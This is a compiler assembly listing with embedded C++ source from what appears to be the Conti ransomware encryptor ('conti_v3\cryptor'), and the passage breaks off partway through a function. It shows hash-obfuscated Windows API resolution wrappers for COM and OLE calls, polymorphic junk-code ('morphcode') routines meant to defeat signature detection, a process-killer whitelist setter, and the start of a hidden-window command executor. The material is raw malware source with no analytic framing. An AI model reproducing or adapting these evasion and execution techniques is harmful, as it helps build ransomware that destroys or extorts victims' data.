  00024	48 8b 54 24 60	 mov	 rdx, QWORD PTR ppv$[rsp]
  00029	4c 8b cb	 mov	 r9, rbx
  0002c	48 8b cf	 mov	 rcx, rdi
  0002f	33 d2		 xor	 edx, edx
  00031	44 8d 42 01	 lea	 r8d, QWORD PTR [rdx+1]

; 785  : }

  00035	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  0003a	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0003e	5f		 pop	 rdi

; 784  : 	return pFunction(rclsid, pUnkOuter, dwClsContext, riid, ppv);

  0003f	48 ff e0	 rex_jmp rax
?pCoCreateInstance@@YAJAEBU_GUID@@PEAUIUnknown@@K0PEAPEAX@Z ENDP ; pCoCreateInstance
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCoSetProxyBlanket@@YAJPEAUIUnknown@@KKPEA_WKKPEAXK@Z
_TEXT	SEGMENT
pProxy$ = 80
dwAuthnSvc$dead$ = 88
dwAuthzSvc$dead$ = 96
pServerPrincName$dead$ = 104
dwAuthnLevel$dead$ = 112
dwImpLevel$dead$ = 120
pAuthInfo$dead$ = 128
dwCapabilities$dead$ = 136
?pCoSetProxyBlanket@@YAJPEAUIUnknown@@KKPEA_WKKPEAXK@Z PROC ; pCoSetProxyBlanket, COMDAT

; 797  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 40	 sub	 rsp, 64			; 00000040H

; 798  : 	HRESULT(WINAPI * pFunction)(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
; 799  : 	pFunction = (HRESULT(WINAPI*)(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x9b4ca937, 41);//GetProcAddress(hOle32, OBFA("CoSetProxyBlanket"));

  00006	ba 18 00 00 00	 mov	 edx, 24
  0000b	41 b8 37 a9 4c
	9b		 mov	 r8d, -1689474761	; 9b4ca937H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 11	 lea	 r9d, QWORD PTR [rdx+17]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 800  : 	return pFunction(pProxy, dwAuthnSvc, dwAuthzSvc, pServerPrincName, dwAuthnLevel, dwImpLevel, pAuthInfo, dwCapabilities);

  0001d	33 c9		 xor	 ecx, ecx
  0001f	45 33 c9	 xor	 r9d, r9d
  00022	89 8c 24 88 00
	00 00		 mov	 DWORD PTR dwCapabilities$dead$[rsp], ecx
  00029	45 33 c0	 xor	 r8d, r8d
  0002c	48 89 8c 24 80
	00 00 00	 mov	 QWORD PTR pAuthInfo$dead$[rsp], rcx
  00034	c7 44 24 78 03
	00 00 00	 mov	 DWORD PTR dwImpLevel$dead$[rsp], 3
  0003c	8d 51 0a	 lea	 edx, QWORD PTR [rcx+10]
  0003f	c7 44 24 70 03
	00 00 00	 mov	 DWORD PTR dwAuthnLevel$dead$[rsp], 3
  00047	48 8b cb	 mov	 rcx, rbx

; 801  : }

  0004a	48 83 c4 40	 add	 rsp, 64			; 00000040H
  0004e	5b		 pop	 rbx

; 800  : 	return pFunction(pProxy, dwAuthnSvc, dwAuthzSvc, pServerPrincName, dwAuthnLevel, dwImpLevel, pAuthInfo, dwCapabilities);

  0004f	48 ff e0	 rex_jmp rax
?pCoSetProxyBlanket@@YAJPEAUIUnknown@@KKPEA_WKKPEAXK@Z ENDP ; pCoSetProxyBlanket
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCoInitializeSecurity@@YAJPEAXJPEAUtagSOLE_AUTHENTICATION_SERVICE@@0KK0K0@Z
_TEXT	SEGMENT
pSecDesc$dead$ = 96
cAuthSvc$dead$ = 104
asAuthSvc$dead$ = 112
pReserved1$dead$ = 120
dwAuthnLevel$dead$ = 128
dwImpLevel$dead$ = 136
pAuthList$dead$ = 144
dwCapabilities$dead$ = 152
pReserved3$dead$ = 160
?pCoInitializeSecurity@@YAJPEAXJPEAUtagSOLE_AUTHENTICATION_SERVICE@@0KK0K0@Z PROC ; pCoInitializeSecurity, COMDAT

; 814  : {

$LN4:
  00000	48 83 ec 58	 sub	 rsp, 88			; 00000058H

; 815  : 	HRESULT(WINAPI * pFunction)(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*);
; 816  : 	pFunction = (HRESULT(WINAPI*)(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0xfaf3fba8, 40);//GetProcAddress(hOle32, OBFA("CoInitializeSecurity"));

  00004	ba 18 00 00 00	 mov	 edx, 24
  00009	41 b8 a8 fb f3
	fa		 mov	 r8d, -84673624		; faf3fba8H
  0000f	44 8d 4a 10	 lea	 r9d, QWORD PTR [rdx+16]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 817  : 	return pFunction(pSecDesc, cAuthSvc, asAuthSvc, pReserved1, dwAuthnLevel, dwImpLevel, pAuthList, dwCapabilities, pReserved3);

  00018	33 c9		 xor	 ecx, ecx
  0001a	45 33 c9	 xor	 r9d, r9d
  0001d	48 89 8c 24 a0
	00 00 00	 mov	 QWORD PTR pReserved3$dead$[rsp], rcx
  00025	45 33 c0	 xor	 r8d, r8d
  00028	89 8c 24 98 00
	00 00		 mov	 DWORD PTR dwCapabilities$dead$[rsp], ecx
  0002f	48 89 8c 24 90
	00 00 00	 mov	 QWORD PTR pAuthList$dead$[rsp], rcx
  00037	c7 84 24 88 00
	00 00 03 00 00
	00		 mov	 DWORD PTR dwImpLevel$dead$[rsp], 3
  00042	8d 51 ff	 lea	 edx, QWORD PTR [rcx-1]
  00045	89 8c 24 80 00
	00 00		 mov	 DWORD PTR dwAuthnLevel$dead$[rsp], ecx

; 818  : }

  0004c	48 83 c4 58	 add	 rsp, 88			; 00000058H

; 817  : 	return pFunction(pSecDesc, cAuthSvc, asAuthSvc, pReserved1, dwAuthnLevel, dwImpLevel, pAuthList, dwCapabilities, pReserved3);

  00050	48 ff e0	 rex_jmp rax
?pCoInitializeSecurity@@YAJPEAXJPEAUtagSOLE_AUTHENTICATION_SERVICE@@0KK0K0@Z ENDP ; pCoInitializeSecurity
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCoInitializeEx@@YAJPEAXK@Z
_TEXT	SEGMENT
pvReserved$dead$ = 48
dwCoInit$dead$ = 56
?pCoInitializeEx@@YAJPEAXK@Z PROC			; pCoInitializeEx, COMDAT

; 824  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 825  : 	HRESULT(WINAPI * pFunction)(LPVOID, DWORD);
; 826  : 	pFunction = (HRESULT(WINAPI*)(LPVOID, DWORD))getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x499c819f, 39);//GetProcAddress(hOle32, OBFA("CoInitializeEx"));

  00004	ba 18 00 00 00	 mov	 edx, 24
  00009	41 b8 9f 81 9c
	49		 mov	 r8d, 1234993567		; 499c819fH
  0000f	44 8d 4a 0f	 lea	 r9d, QWORD PTR [rdx+15]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 827  : 	return pFunction(pvReserved, dwCoInit);

  00018	33 d2		 xor	 edx, edx
  0001a	33 c9		 xor	 ecx, ecx

; 828  : }

  0001c	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 827  : 	return pFunction(pvReserved, dwCoInit);

  00020	48 ff e0	 rex_jmp rax
?pCoInitializeEx@@YAJPEAXK@Z ENDP			; pCoInitializeEx
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pStrStrIW@@YAPEB_WPEB_W0@Z
_TEXT	SEGMENT
pszFirst$ = 48
pszSrch$ = 56
?pStrStrIW@@YAPEB_WPEB_W0@Z PROC			; pStrStrIW, COMDAT

; 1004 : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 1005 : 	PCWSTR(WINAPI * pFunction)(PCWSTR, PCWSTR);
; 1006 : 	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));

  0000d	41 b8 61 fe ae
	f8		 mov	 r8d, -122749343		; f8aefe61H
  00013	ba 16 00 00 00	 mov	 edx, 22
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 01	 lea	 r9d, QWORD PTR [rdx+1]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1007 : 	return pFunction(pszFirst, pszSrch);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 1008 : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 1007 : 	return pFunction(pszFirst, pszSrch);

  00034	48 ff e0	 rex_jmp rax
?pStrStrIW@@YAPEB_WPEB_W0@Z ENDP			; pStrStrIW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pSysAllocString@@YAPEA_WPEB_W@Z
_TEXT	SEGMENT
psz$ = 48
?pSysAllocString@@YAPEA_WPEB_W@Z PROC			; pSysAllocString, COMDAT

; 1040 : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 1041 : 	BSTR(WINAPI * pFunction)(const OLECHAR*);
; 1042 : 	pFunction = (BSTR(WINAPI*)(const OLECHAR*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0x54def57d, 20);

  00006	ba 19 00 00 00	 mov	 edx, 25
  0000b	41 b8 7d f5 de
	54		 mov	 r8d, 1423897981		; 54def57dH
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a fb	 lea	 r9d, QWORD PTR [rdx-5]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1043 : 	return pFunction(psz);

  0001d	48 8b cb	 mov	 rcx, rbx

; 1044 : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 1043 : 	return pFunction(psz);

  00025	48 ff e0	 rex_jmp rax
?pSysAllocString@@YAPEA_WPEB_W@Z ENDP			; pSysAllocString
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pVariantInit@@YAXPEAUtagVARIANT@@@Z
_TEXT	SEGMENT
pvarg$ = 48
?pVariantInit@@YAXPEAUtagVARIANT@@@Z PROC		; pVariantInit, COMDAT

; 1049 : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 1050 : 	VOID(WINAPI * pFunction)(VARIANTARG*);
; 1051 : 	pFunction = (VOID(WINAPI*)(VARIANTARG*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xfc4ef6a9, 19);

  00006	ba 19 00 00 00	 mov	 edx, 25
  0000b	41 b8 a9 f6 4e
	fc		 mov	 r8d, -61933911		; fc4ef6a9H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a fa	 lea	 r9d, QWORD PTR [rdx-6]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1052 : 	return pFunction(pvarg);

  0001d	48 8b cb	 mov	 rcx, rbx

; 1053 : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 1052 : 	return pFunction(pvarg);

  00025	48 ff e0	 rex_jmp rax
?pVariantInit@@YAXPEAUtagVARIANT@@@Z ENDP		; pVariantInit
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pVariantClear@@YAJPEAUtagVARIANT@@@Z
_TEXT	SEGMENT
pvarg$ = 48
?pVariantClear@@YAJPEAUtagVARIANT@@@Z PROC		; pVariantClear, COMDAT

; 1060 : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 1061 : 	HRESULT(WINAPI * pFunction)(VARIANTARG*);
; 1062 : 	pFunction = (HRESULT(WINAPI*)(VARIANTARG*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0xbc7bf3e8, 18);

  00006	ba 19 00 00 00	 mov	 edx, 25
  0000b	41 b8 e8 f3 7b
	bc		 mov	 r8d, -1132727320	; bc7bf3e8H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a f9	 lea	 r9d, QWORD PTR [rdx-7]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1063 : 	return pFunction(pvarg);

  0001d	48 8b cb	 mov	 rcx, rbx

; 1064 : }

  00020	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00024	5b		 pop	 rbx

; 1063 : 	return pFunction(pvarg);

  00025	48 ff e0	 rex_jmp rax
?pVariantClear@@YAJPEAUtagVARIANT@@@Z ENDP		; pVariantClear
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
;	COMDAT ?morphcode@@YAXXZ
_TEXT	SEGMENT
_morph_var$ = 8
?morphcode@@YAXXZ PROC					; morphcode, COMDAT

; 82   : 	//   
; 83   : 
; 84   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00000	c7 44 24 08 0f
	1f 18 00	 mov	 DWORD PTR _morph_var$[rsp], 1580815 ; 00181f0fH

; 85   : }

  00008	c3		 ret	 0
?morphcode@@YAXXZ ENDP					; morphcode
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?SetWhiteListProcess@cryptor@@YAXPEAUPID_LIST@process_killer@@@Z
_TEXT	SEGMENT
PidList$ = 8
?SetWhiteListProcess@cryptor@@YAXPEAUPID_LIST@process_killer@@@Z PROC ; cryptor::SetWhiteListProcess, COMDAT

; 23   : 	g_WhitelistPids = PidList;

  00000	48 89 0d 00 00
	00 00		 mov	 QWORD PTR ?g_WhitelistPids@@3PEAUPID_LIST@process_killer@@EA, rcx ; g_WhitelistPids

; 24   : }

  00007	c3		 ret	 0
?SetWhiteListProcess@cryptor@@YAXPEAUPID_LIST@process_killer@@@Z ENDP ; cryptor::SetWhiteListProcess
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?CmdExecW@@YAXPEB_W@Z
_TEXT	SEGMENT
_morph_var$1 = 80
_morph_var$2 = 80
_morph_var$3 = 80
_morph_var$4 = 80
_morph_var$5 = 80
_morph_var$6 = 80
pi$ = 88
si$ = 112
CmdLine$ = 224
__$ArrayPad$ = 2272
lpCmdLine$ = 2304
?CmdExecW@@YAXPEB_W@Z PROC				; CmdExecW, COMDAT

; 28   : {

$LN334:
  00000	48 89 5c 24 10	 mov	 QWORD PTR [rsp+16], rbx
  00005	48 89 7c 24 18	 mov	 QWORD PTR [rsp+24], rdi
  0000a	55		 push	 rbp
  0000b	48 8d ac 24 10
	f8 ff ff	 lea	 rbp, QWORD PTR [rsp-2032]
  00013	48 81 ec f0 08
	00 00		 sub	 rsp, 2288		; 000008f0H
  0001a	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00021	48 33 c4	 xor	 rax, rsp
  00024	48 89 85 e0 07
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp-256], rax
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  0002b	33 c0		 xor	 eax, eax
  0002d	48 8d 7d e0	 lea	 rdi, QWORD PTR CmdLine$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 28   : {

  00031	48 8b d9	 mov	 rbx, rcx
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  00034	b9 00 08 00 00	 mov	 ecx, 2048		; 00000800H
  00039	f3 aa		 rep stosb
  0003b	48 8d 7c 24 70	 lea	 rdi, QWORD PTR si$[rsp]
  00040	b9 68 00 00 00	 mov	 ecx, 104		; 00000068H
  00045	f3 aa		 rep stosb
  00047	48 8d 7c 24 58	 lea	 rdi, QWORD PTR pi$[rsp]
  0004c	b9 18 00 00 00	 mov	 ecx, 24
  00051	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 37   : 	si.wShowWindow = SW_HIDE;

  00053	33 ff		 xor	 edi, edi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00055	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 37   : 	si.wShowWindow = SW_HIDE;

  0005a	66 89 7d b0	 mov	 WORD PTR si$[rbp-192], di
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0005e	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$6[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00066	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$6[rsp]
  0006a	f7 e9		 imul	 ecx
  0006c	8b c2		 mov	 eax, edx
  0006e	c1 e8 1f	 shr	 eax, 31
  00071	03 d0		 add	 edx, eax
  00073	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00076	3b c8		 cmp	 ecx, eax
  00078	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$6[rsp]
  0007c	74 44		 je	 SHORT $LN19@CmdExecW

; 49   : 		_morph_var += (int)a + 2;

  0007e	83 c0 02	 add	 eax, 2
  00081	89 44 24 50	 mov	 DWORD PTR _morph_var$6[rsp], eax

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00085	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$6[rsp]
  00089	f7 44 24 50 03
	00 00 80	 test	 DWORD PTR _morph_var$6[rsp], -2147483645 ; ffffffff80000003H
  00091	0f 85 7c 00 00
	00		 jne	 $LN18@CmdExecW
  00097	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL11@CmdExecW:
  000a0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$6[rsp]
  000a4	ff c0		 inc	 eax
  000a6	89 44 24 50	 mov	 DWORD PTR _morph_var$6[rsp], eax
  000aa	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$6[rsp]
  000ae	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  000b3	7d 07		 jge	 SHORT $LN252@CmdExecW
  000b5	ff c8		 dec	 eax
  000b7	83 c8 fc	 or	 eax, -4
  000ba	ff c0		 inc	 eax
$LN252@CmdExecW:
  000bc	85 c0		 test	 eax, eax
  000be	74 e0		 je	 SHORT $LL11@CmdExecW

; 51   : 	}

  000c0	eb 51		 jmp	 SHORT $LN18@CmdExecW
$LN19@CmdExecW:

; 53   : 		_morph_var -= (int)a - 2;

  000c2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$6[rsp]
  000c6	83 c0 02	 add	 eax, 2
  000c9	89 44 24 50	 mov	 DWORD PTR _morph_var$6[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  000cd	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000d2	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$6[rsp]
  000d6	f7 e9		 imul	 ecx
  000d8	8b c2		 mov	 eax, edx
  000da	c1 e8 1f	 shr	 eax, 31
  000dd	03 d0		 add	 edx, eax
  000df	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000e2	3b c8		 cmp	 ecx, eax
  000e4	75 2d		 jne	 SHORT $LN18@CmdExecW
  000e6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL13@CmdExecW:
  000f0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$6[rsp]
  000f4	ff c0		 inc	 eax
  000f6	89 44 24 50	 mov	 DWORD PTR _morph_var$6[rsp], eax
  000fa	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000ff	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$6[rsp]
  00103	f7 e9		 imul	 ecx
  00105	8b c2		 mov	 eax, edx
  00107	c1 e8 1f	 shr	 eax, 31
  0010a	03 d0		 add	 edx, eax
  0010c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0010f	3b c8		 cmp	 ecx, eax
  00111	74 dd		 je	 SHORT $LL13@CmdExecW
$LN18@CmdExecW:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 39   : 	si.cb = sizeof(si);

  00113	c7 44 24 70 68
	00 00 00	 mov	 DWORD PTR si$[rsp], 104	; 00000068H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0011b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00120	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$5[rsp], 1547201 ; 00179bc1H
  00128	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$5[rsp]
  0012c	f7 e9		 imul	 ecx
  0012e	8b c2		 mov	 eax, edx
  00130	c1 e8 1f	 shr	 eax, 31
  00133	03 d0		 add	 edx, eax
  00135	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00138	3b c8		 cmp	 ecx, eax
  0013a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$5[rsp]
  0013e	74 42		 je	 SHORT $LN40@CmdExecW

; 49   : 		_morph_var += (int)a + 2;

  00140	83 c0 6a	 add	 eax, 106		; 0000006aH
  00143	89 44 24 50	 mov	 DWORD PTR _morph_var$5[rsp], eax

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00147	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$5[rsp]
  0014b	f7 44 24 50 03
	00 00 80	 test	 DWORD PTR _morph_var$5[rsp], -2147483645 ; ffffffff80000003H
  00153	75 7e		 jne	 SHORT $LN39@CmdExecW
  00155	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL32@CmdExecW:
  00160	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$5[rsp]
  00164	ff c0		 inc	 eax
  00166	89 44 24 50	 mov	 DWORD PTR _morph_var$5[rsp], eax
  0016a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$5[rsp]
  0016e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00173	7d 07		 jge	 SHORT $LN249@CmdExecW
  00175	ff c8		 dec	 eax
  00177	83 c8 fc	 or	 eax, -4
  0017a	ff c0		 inc	 eax
$LN249@CmdExecW:
  0017c	85 c0		 test	 eax, eax
  0017e	74 e0		 je	 SHORT $LL32@CmdExecW

; 51   : 	}

  00180	eb 51		 jmp	 SHORT $LN39@CmdExecW
$LN40@CmdExecW:

; 53   : 		_morph_var -= (int)a - 2;

  00182	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$5[rsp]
  00186	83 e8 66	 sub	 eax, 102		; 00000066H
  00189	89 44 24 50	 mov	 DWORD PTR _morph_var$5[rsp], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0018d	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00192	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$5[rsp]
  00196	f7 e9		 imul	 ecx
  00198	8b c2		 mov	 eax, edx
  0019a	c1 e8 1f	 shr	 eax, 31
  0019d	03 d0		 add	 edx, eax
  0019f	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001a2	3b c8		 cmp	 ecx, eax
  001a4	75 2d		 jne	 SHORT $LN39@CmdExecW
  001a6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL34@CmdExecW:
  001b0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$5[rsp]
  001b4	ff c0		 inc	 eax
  001b6	89 44 24 50	 mov	 DWORD PTR _morph_var$5[rsp], eax
  001ba	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001bf	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$5[rsp]
  001c3	f7 e9		 imul	 ecx
  001c5	8b c2		 mov	 eax, edx
  001c7	c1 e8 1f	 shr	 eax, 31
  001ca	03 d0		 add	 edx, eax
  001cc	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001cf	3b c8		 cmp	 ecx, eax
  001d1	74 dd		 je	 SHORT $LL34@CmdExecW
$LN39@CmdExecW:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 41   : 	si.dwFlags = STARTF_USESHOWWINDOW;

  001d3	c7 45 ac 01 00
	00 00		 mov	 DWORD PTR si$[rbp-196], 1
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  001da	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001df	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$4[rsp], 1547201 ; 00179bc1H
  001e7	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$4[rsp]
  001eb	f7 e9		 imul	 ecx
  001ed	8b c2		 mov	 eax, edx
  001ef	c1 e8 1f	 shr	 eax, 31
  001f2	03 d0		 add	 edx, eax
  001f4	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001f7	3b c8		 cmp	 ecx, eax
  001f9	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$4[rsp]
  001fd	74 43		 je	 SHORT $LN61@CmdExecW

; 49   : 		_morph_var += (int)a + 2;

  001ff	83 c0 03	 add	 eax, 3
  00202	89 44 24 50	 mov	 DWORD PTR _morph_var$4[rsp], eax

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00206	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$4[rsp]
  0020a	f7 44 24 50 03
	00 00 80	 test	 DWORD PTR _morph_var$4[rsp], -2147483645 ; ffffffff80000003H
